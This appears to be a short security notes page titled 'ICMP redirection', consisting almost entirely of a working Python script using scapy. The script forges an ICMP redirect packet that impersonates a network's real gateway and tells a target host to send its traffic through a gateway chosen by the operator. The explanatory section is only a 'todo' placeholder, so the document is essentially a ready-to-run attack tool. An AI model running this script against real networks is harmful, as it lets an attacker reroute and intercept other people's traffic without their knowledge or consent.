# ICMP redirection

## todo: how ICMP redirection works


## code

```py
#! /usr/bin/python3

import sys
import getopt
from scapy.all import send, IP, ICMP

# the address we send the packet to
target = None

# the address of the original gateway
old_gw = None

# the address of the disired gateway
new_gw = None


def usage():
    print(sys.argv[0] + """
    -t <target>
    -o <old_fw>
    -n <new_gw>""")
    sys.exit(1)


# parsing parameter
try:
    cmd_opts = "t:o:n:r:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-t":
        target = opt[1]
    elif opt[0] == "-o":
        old_gw = opt[1]
    elif opt[0] == "-n":
        new_gw = opt[1]
    else:
        usage()

# construct and send the packet
packet = IP(src=old_gw, dst=target)/ICMP(type=5, code=1,
                                         gw=new_gw)/IP(src=target, dst='0.0.0.0')

send(packet)

```